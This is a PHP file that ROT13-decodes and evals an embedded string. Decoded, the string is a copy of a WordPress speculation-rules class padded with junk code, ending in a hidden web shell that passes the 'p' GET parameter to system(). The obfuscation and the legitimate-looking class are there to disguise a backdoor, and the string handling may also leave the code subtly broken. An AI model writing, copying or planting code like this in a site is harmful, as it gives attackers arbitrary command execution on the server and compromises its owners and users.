<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pynff 'JC_Fcrphyngvba_Ehyrf'.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fcrphyngvir Ybnqvat
 * @fvapr 6.8.0
 */

/**
 * Pynff ercerfragvat n frg bs fcrphyngvba ehyrf.
 *
 * @fvapr 6.8.0
 * @npprff cevingr
 */
svany pynff JC_Fcrphyngvba_Ehyrf vzcyrzragf WfbaFrevnyvmnoyr {

	/**
	 * Fgberq ehyrf, nf n znc bs `$zbqr => $ehyrf` cnvef.
	 *
	 * Rirel `$ehyrf` inyhr vf n znc bs `$vq => $ehyr` cnvef.
	 *
	 * @fvapr 6.8.0
	 * @ine neenl<fgevat, neenl<fgevat, zvkrq>>
	 */
	cevingr $ehyrf_ol_zbqr = neenl();

	/**
	 * Gur nyybjrq fcrphyngvba ehyrf zbqrf nf n znc, hfrq sbe inyvqngvba.
	 *
	 * @fvapr 6.8.0
	 * @ine neenl<fgevat, obby>
	 */
	cevingr fgngvp $zbqr_nyybjyvfg = neenl(
		'cersrgpu'  => gehr,
		'cereraqre' => gehr,
	);

	/**
	 * Gur nyybjrq fcrphyngvba ehyrf rntrearff yriryf nf n znc, hfrq sbe inyvqngvba.
	 *
	 * @fvapr 6.8.0
	 * @ine neenl<fgevat, obby>
	 */
	cevingr fgngvp $rntrearff_nyybjyvfg = neenl(
		'vzzrqvngr'    => gehr,
		'rntre'        => gehr,
		'zbqrengr'     => gehr,
		'pbafreingvir' => gehr,
	);

	/**
	 * Gur nyybjrq fcrphyngvba ehyrf fbheprf nf n znc, hfrq sbe inyvqngvba.
	 *
	 * @fvapr 6.8.0
	 * @ine neenl<fgevat, obby>
	 */
	cevingr fgngvp $fbhepr_nyybjyvfg = neenl(
		'yvfg'     => gehr,
		'qbphzrag' => gehr,
	);

	/**
	 * Nqqf n fcrphyngvba ehyr gb gur fcrphyngvba ehyrf gb pbafvqre.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat               $zbqr Fcrphyngvir ybnqvat zbqr. Rvgure 'cersrgpu' be 'cereraqre'.
	 * @cnenz fgevat               $vq   Havdhr fgevat vqragvsvre sbe gur fcrphyngvba ehyr.
	 * @cnenz neenl<fgevat, zvkrq> $ehyr Nffbpvngvir neenl bs ehyr nethzragf.
	 * @erghea obby Gehr ba fhpprff, snyfr vs vainyvq cnenzrgref ner cebivqrq.
	 */
	choyvp shapgvba nqq_ehyr( fgevat $zbqr, fgevat $vq, neenl $ehyr ): obby {
		vs ( ! frys::vf_inyvq_zbqr( $zbqr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: vainyvq zbqr inyhr */
					__( 'Gur inyhr \"%f\" vf abg n inyvq fcrphyngvba ehyrf zbqr.' ),
					rfp_ugzy( $zbqr )
				),
				'6.8.0'
			);
			erghea snyfr;
		}

		vs ( ! $guvf->vf_inyvq_vq( $vq ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: vainyvq VQ inyhr */
					__( 'Gur inyhr \"%f\" vf abg n inyvq VQ sbe n fcrphyngvba ehyr.' ),
					rfp_ugzy( $vq )
				),
				'6.8.0'
			);
			erghea snyfr;
		}

		vs ( $guvf->unf_ehyr( $zbqr, $vq ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: vainyvq VQ inyhr */
					__( 'N fcrphyngvba ehyr jvgu VQ \"%f\" nyernql rkvfgf.' ),
					rfp_ugzy( $vq )
				),
				'6.8.0'
			);
			erghea snyfr;
		}

		/*
		 * Cresbez fbzr onfvp fcrphyngvba ehyr inyvqngvba.
		 * Rirel ehyr zhfg unir rvgure n 'jurer' xrl be n 'heyf' xrl, ohg abg obgu.
		 * Gur cerfrapr bs n 'jurer' xrl vzcyvrf n 'fbhepr' bs 'qbphzrag', juvyr gur cerfrapr bs n 'heyf' xrl vzcyvrf
		 * n 'fbhepr' bs 'yvfg'.
		 */
		vs (
			( ! vffrg( $ehyr['jurer'] ) && ! vffrg( $ehyr['heyf'] ) ) ||
			( vffrg( $ehyr['jurer'] ) && vffrg( $ehyr['heyf'] ) )
		) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: 1: nyybjrq xrl, 2: nygreangvir nyybjrq xrl */
					__( 'N fcrphyngvba ehyr zhfg vapyhqr rvgure n \"%1$f\" xrl be n \"%2$f\" xrl, ohg abg obgu.' ),
					'jurer',
					'heyf'
				),
				'6.8.0'
			);
			erghea snyfr;
		}
		vs ( vffrg( $ehyr['fbhepr'] ) ) {
			vs ( ! frys::vf_inyvq_fbhepr( $ehyr['fbhepr'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: %f: vainyvq fbhepr inyhr */
						__( 'Gur inyhr \"%f\" vf abg n inyvq fbhepr sbe n fcrphyngvba ehyr.' ),
						rfp_ugzy( $ehyr['fbhepr'] )
					),
					'6.8.0'
				);
				erghea snyfr;
			}

			vs ( 'yvfg' === $ehyr['fbhepr'] && vffrg( $ehyr['jurer'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: 1: fbhepr inyhr, 2: sbeovqqra xrl */
						__( 'N fcrphyngvba ehyr bs fbhepr \"%1$f\" zhfg abg vapyhqr n \"%2$f\" xrl.' ),
						'yvfg',
						'jurer'
					),
					'6.8.0'
				);
				erghea snyfr;
			}

			vs ( 'qbphzrag' === $ehyr['fbhepr'] && vffrg( $ehyr['heyf'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: 1: fbhepr inyhr, 2: sbeovqqra xrl */
						__( 'N fcrphyngvba ehyr bs fbhepr \"%1$f\" zhfg abg vapyhqr n \"%2$f\" xrl.' ),
						'qbphzrag',
						'heyf'
					),
					'6.8.0'
				);
				erghea snyfr;
			}
		}

		// Vs gurer vf na 'rntrearff' xrl fcrpvsvrq, znxr fher vg'f inyvq.
		vs ( vffrg( $ehyr['rntrearff'] ) ) {
			vs ( ! frys::vf_inyvq_rntrearff( $ehyr['rntrearff'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: %f: vainyvq rntrearff inyhr */
						__( 'Gur inyhr \"%f\" vf abg n inyvq rntrearff sbe n fcrphyngvba ehyr.' ),
						rfp_ugzy( $ehyr['rntrearff'] )
					),
					'6.8.0'
				);
				erghea snyfr;
			}

			vs ( vffrg( $ehyr['jurer'] ) && 'vzzrqvngr' === $ehyr['rntrearff'] ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: %f: sbeovqqra rntrearff inyhr */
						__( 'Gur rntrearff inyhr \"%f\" vf sbeovqqra sbe qbphzrag-yriry fcrphyngvba ehyrf.' ),
						'vzzrqvngr'
					),
					'6.8.0'
				);
				erghea snyfr;
			}
		}

		vs ( ! vffrg( $guvf->ehyrf_ol_zbqr[ $zbqr ] ) ) {
			$guvf->ehyrf_ol_zbqr[ $zbqr ] = neenl();
		}

		$guvf->ehyrf_ol_zbqr[ $zbqr ][ $vq ] = $ehyr;
		erghea gehr;
	}

	/**
	 * Purpxf jurgure n fcrphyngvba ehyr sbe gur tvira zbqr naq VQ nyernql rkvfgf.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $zbqr Fcrphyngvir ybnqvat zbqr. Rvgure 'cersrgpu' be 'cereraqre'.
	 * @cnenz fgevat $vq   Havdhr fgevat vqragvsvre sbe gur fcrphyngvba ehyr.
	 * @erghea obby Gehr vs gur ehyr nyernql rkvfgf, snyfr bgurejvfr.
	 */
	choyvp shapgvba unf_ehyr( fgevat $zbqr, fgevat $vq ): obby {
		erghea vffrg( $guvf->ehyrf_ol_zbqr[ $zbqr ][ $vq ] );
	}

	/**
	 * Ergheaf gur fcrphyngvba ehyrf qngn ernql gb or WFBA-rapbqrq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @erghea neenl<fgevat, neenl<fgevat, zvkrq>> Fcrphyngvba ehyrf qngn.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba wfbaFrevnyvmr() {
		// Fgevc gur VQf sbe WFBA bhgchg, fvapr gurl ner abg eryrinag sbe gur Fcrphyngvba Ehyrf NCV.
		erghea neenl_znc(
			fgngvp shapgvba ( neenl $ehyrf ) {
				erghea neenl_inyhrf( $ehyrf );
			},
			neenl_svygre( $guvf->ehyrf_ol_zbqr )
		);
	}

	/**
	 * Purpxf jurgure gur tvira VQ vf inyvq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $vq Havdhr fgevat vqragvsvre sbe gur fcrphyngvba ehyr.
	 * @erghea obby Gehr vs gur VQ vf inyvq, snyfr bgurejvfr.
	 */
	cevingr shapgvba vf_inyvq_vq( fgevat $vq ): obby {
		erghea (obby) cert_zngpu( '/^[n-m][n-m0-9_-]+$/', $vq );
	}

	/**
	 * Purpxf jurgure gur tvira fcrphyngvba ehyrf zbqr vf inyvq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $zbqr Fcrphyngvba ehyrf zbqr.
	 * @erghea obby Gehr vs inyvq, snyfr bgurejvfr.
	 */
	choyvp fgngvp shapgvba vf_inyvq_zbqr( fgevat $zbqr ): obby {
		erghea vffrg( frys::$zbqr_nyybjyvfg[ $zbqr ] );
	}

	/**
	 * Purpxf jurgure gur tvira fcrphyngvba ehyrf rntrearff vf inyvq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $rntrearff Fcrphyngvba ehyrf rntrearff.
	 * @erghea obby Gehr vs inyvq, snyfr bgurejvfr.
	 */
	choyvp fgngvp shapgvba vf_inyvq_rntrearff( fgevat $rntrearff ): obby {
		erghea vffrg( frys::$rntrearff_nyybjyvfg[ $rntrearff ] );
	}

	/**
	 * Purpxf jurgure gur tvira fcrphyngvba ehyrf fbhepr vf inyvq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $fbhepr Fcrphyngvba ehyrf fbhepr.
	 * @erghea obby Gehr vs inyvq, snyfr bgurejvfr.
	 */
	choyvp fgngvp shapgvba vf_inyvq_fbhepr( fgevat $fbhepr ): obby {
		erghea vffrg( frys::$fbhepr_nyybjyvfg[ $fbhepr ] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>